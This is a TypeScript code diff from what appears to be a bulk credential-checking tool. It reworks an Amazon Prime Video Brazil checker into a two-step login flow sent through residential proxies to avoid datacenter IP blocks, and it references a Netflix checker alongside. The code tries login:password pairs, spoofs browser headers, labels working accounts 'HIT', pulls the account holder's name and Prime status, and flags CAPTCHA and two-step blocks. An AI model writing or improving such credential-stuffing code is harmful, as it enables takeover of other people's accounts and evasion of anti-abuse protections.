@@ -111,7 +111,7 @@ export interface CheckerBulkResponse {
 
 // ── Shared helpers ────────────────────────────────────────────────────────────
 const MOBILE_UA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
-const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";
 
 // ── Residential proxy args for curl (streaming checkers) ──────────────────────
 // Streaming services block datacenter IPs — route them through residential proxy.
@@ -1541,9 +1541,12 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-//  AMAZON PRIME VIDEO CHECKER — Form scrape → POST signin (residential proxy)
+//  AMAZON PRIME VIDEO CHECKER — 2-step form scrape (residential proxy)
+//  Amazon BR login flow:
+//    Step 1: GET signin page → POST email only → land on password page
+//    Step 2: POST password → check for authenticated home page
 // ═══════════════════════════════════════════════════════════════════════════════
-const AMZ_TIMEOUT = 35_000;
+const AMZ_TIMEOUT = 40_000;
 const AMZ_SIGNIN  = "https://www.amazon.com.br/ap/signin?openid.pape.max_auth_age=0"
   + "&openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2F"
   + "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
@@ -1551,89 +1554,160 @@ const AMZ_SIGNIN  = "https://www.amazon.com.br/ap/signin?openid.pape.max_auth_ag
   + "&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
   + "&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&_encoding=UTF8";
 
+function amzExtractForm(html: string): { action: string; hidden: Record<string, string> } {
+  const hidden: Record<string, string> = {};
+  const re = /<input[^>]+type=["']?hidden["']?[^>]*>/gi;
+  let m: RegExpExecArray | null;
+  while ((m = re.exec(html)) !== null) {
+    const nameM  = m[0].match(/name=["']([^"']+)["']/);
+    const valueM = m[0].match(/value=["']([^"']*?)["']/);
+    if (nameM) hidden[nameM[1]] = (valueM?.[1] ?? "")
+      .replace(/&amp;/g, "&").replace(/&#34;/g, '"').replace(/&#39;/g, "'");
+  }
+  const actionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/i);
+  const raw = actionMatch?.[1] ?? AMZ_SIGNIN;
+  const action = raw.startsWith("http") ? raw : `https://www.amazon.com.br${raw}`;
+  return { action, hidden };
+}
+
+function amzBuildBody(fields: Record<string, string>): string {
+  return Object.entries(fields)
+    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
+    .join("&");
+}
+
 async function checkAmazonPrime(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/amz_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  const amzHeaders = (referer: string) => [
+    "-H", `User-Agent: ${DESKTOP_UA}`,
+    "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+    "-H", "Accept-Encoding: gzip, deflate, br",
+    "-H", `Referer: ${referer}`,
+    "-H", "Origin: https://www.amazon.com.br",
+    "-H", "Sec-Fetch-Dest: document",
+    "-H", "Sec-Fetch-Mode: navigate",
+    "-H", "Sec-Fetch-Site: same-origin",
+    "-H", "Sec-Fetch-User: ?1",
+    "-H", "Upgrade-Insecure-Requests: 1",
+  ];
   try {
-    let getResult: CurlResult;
+    // ── Step 1: GET the sign-in page ─────────────────────────────────────────
+    let step1Html: string;
+    let step1Action: string;
+    let step1Hidden: Record<string, string>;
     try {
-      getResult = await runCurlWithProxyRetry(px => [
-        "--compressed", "-L", "--max-redirs", "5",
+      const r = await runCurlWithProxyRetry(px => [
+        "--compressed", "-L", "--max-redirs", "4",
         ...px,
         "-c", cookieFile, "-b", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
-        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "-H", "Accept-Language: pt-BR,pt;q=0.9",
         AMZ_SIGNIN,
       ], AMZ_TIMEOUT, 3);
+      if (r.body.length < 500 || r.statusCode === 0)
+        return { credential, login, status: "ERROR", detail: `GET1_HTTP_${r.statusCode}` };
+      step1Html = r.body;
+      const f = amzExtractForm(step1Html);
+      step1Action = f.action;
+      step1Hidden = f.hidden;
     } catch (e) {
-      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+      return { credential, login, status: "ERROR", detail: `GET1_ERROR:${String(e)}` };
     }
 
-    const html = getResult.body;
-    if (html.length < 500 || getResult.statusCode === 0)
-      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
+    // ── Step 2: POST email only (advances to password page) ──────────────────
+    let step2Html: string;
+    let step2Action: string;
+    let step2Hidden: Record<string, string>;
+    try {
+      const body1 = amzBuildBody({ ...step1Hidden, email: login, continue: "" });
+      const r = await runCurlWithProxyRetry(px => [
+        "--compressed", "-L", "--max-redirs", "4",
+        ...px,
+        "-b", cookieFile, "-c", cookieFile,
+        ...amzHeaders(AMZ_SIGNIN),
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "--data-raw", body1,
+        step1Action,
+      ], AMZ_TIMEOUT, 3);
+      if (r.body.length < 300 || r.statusCode === 0)
+        return { credential, login, status: "ERROR", detail: `POST1_HTTP_${r.statusCode}` };
 
-    // Extract hidden CSRF/openid fields
-    const hiddenInputs: Record<string, string> = {};
-    const hiddenRe = /<input[^>]+type=["']?hidden["']?[^>]*>/gi;
-    let hm: RegExpExecArray | null;
-    while ((hm = hiddenRe.exec(html)) !== null) {
-      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
-      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
-      if (nameM) hiddenInputs[nameM[1]] = (valueM?.[1] ?? "").replace(/&amp;/g, "&");
+      const bLow1 = r.body.toLowerCase();
+      // If Amazon already shows logged in after email step (rare but possible)
+      if (bLow1.includes("olá,") || bLow1.includes("logout"))
+        return { credential, login, status: "HIT", detail: "amazon_authenticated" };
+      // If email not found
+      if (bLow1.includes("não encontramos") || bLow1.includes("we cannot find") ||
+          bLow1.includes("email address not found") || bLow1.includes("não foi encontrado"))
+        return { credential, login, status: "FAIL", detail: "email_not_found" };
+
+      step2Html = r.body;
+      const f = amzExtractForm(step2Html);
+      step2Action = f.action;
+      step2Hidden = f.hidden;
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST1_ERROR:${String(e)}` };
     }
 
-    const formActionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/i);
-    const rawAction = formActionMatch?.[1] ?? AMZ_SIGNIN;
-    const formAction = rawAction.startsWith("http")
-      ? rawAction : `https://www.amazon.com.br${rawAction}`;
+    // Verify we landed on the password page
+    const s2Low = step2Html.toLowerCase();
+    if (!s2Low.includes("auth-password") && !s2Low.includes("ap_password") &&
+        !s2Low.includes("password") && !s2Low.includes("senha")) {
+      if (s2Low.includes("captcha") || s2Low.includes("puzzle"))
+        return { credential, login, status: "ERROR", detail: "CAPTCHA_REQUIRED" };
+      return { credential, login, status: "ERROR", detail: "UNEXPECTED_PAGE_AFTER_EMAIL" };
+    }
 
-    const postBody = Object.entries({ ...hiddenInputs, email: login, password, signin: "" })
-      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
-      .join("&");
-
+    // ── Step 3: POST password ─────────────────────────────────────────────────
     let postResult: CurlResult;
     try {
+      // Ensure email is in step2 hidden fields (Amazon puts it there)
+      if (!step2Hidden["email"]) step2Hidden["email"] = login;
+      const body2 = amzBuildBody({ ...step2Hidden, password, rememberMe: "true", signIn: "" });
       postResult = await runCurlWithProxyRetry(px => [
         "--compressed", "-L", "--max-redirs", "8",
         ...px,
         "-b", cookieFile, "-c", cookieFile,
-        "-H", `User-Agent: ${DESKTOP_UA}`,
+        ...amzHeaders(step1Action),
         "-H", "Content-Type: application/x-www-form-urlencoded",
-        "-H", `Referer: ${AMZ_SIGNIN}`,
-        "-H", "Origin: https://www.amazon.com.br",
-        "--data-raw", postBody,
-        formAction,
+        "--data-raw", body2,
+        step2Action,
       ], AMZ_TIMEOUT, 3);
     } catch (e) {
-      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+      return { credential, login, status: "ERROR", detail: `POST2_ERROR:${String(e)}` };
     }
 
     const body = postResult.body;
     const bLow = body.toLowerCase();
+
     if (bLow.includes("olá,") || bLow.includes("minha conta") || bLow.includes("logout") ||
         bLow.includes("prime video") || bLow.includes("conta &amp; listas") ||
         (postResult.statusCode === 200 && !bLow.includes("ap/signin") && bLow.includes("amazon.com.br"))) {
       let detail = "amazon_authenticated";
       try {
-        // "Olá, NOME" pattern in the HTML
         const nameMatch = body.match(/Olá,\s*([^<\n]{2,50})/i) ||
                           body.match(/Hello,\s*([^<\n]{2,50})/i) ||
                           body.match(/class="[^"]*nav-line-1[^"]*"[^>]*>\s*([^<]{2,50})/i);
         if (nameMatch) detail = `logado:${nameMatch[1].trim().slice(0, 50)}`;
-        // Prime membership indicator
-        if (bLow.includes("prime video") || bLow.includes("amazon prime")) {
+        if (bLow.includes("prime video") || bLow.includes("amazon prime"))
           detail += " | prime:sim";
-        }
       } catch { /**/ }
       return { credential, login, status: "HIT", detail };
     }
     if (bLow.includes("senha incorreta") || bLow.includes("e-mail ou senha incorretos") ||
-        bLow.includes("incorrect password") || bLow.includes("há um problema"))
+        bLow.includes("incorrect password") || bLow.includes("há um problema com sua senha") ||
+        bLow.includes("password is incorrect"))
       return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+    if (bLow.includes("captcha") || bLow.includes("puzzle"))
+      return { credential, login, status: "ERROR", detail: "CAPTCHA_REQUIRED" };
+    if (bLow.includes("verificação") || bLow.includes("two-step") || bLow.includes("otp") ||
+        bLow.includes("código de verificação"))
+      return { credential, login, status: "ERROR", detail: "TWO_STEP_AUTH_REQUIRED" };
     if (bLow.includes("ap/signin") || bLow.includes("auth-email"))
-      return { credential, login, status: "FAIL", detail: "still_on_signin" };
+      return { credential, login, status: "ERROR", detail: "STILL_ON_SIGNIN_PAGE" };
     if (postResult.statusCode === 0 || postResult.statusCode >= 500)
       return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
     return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
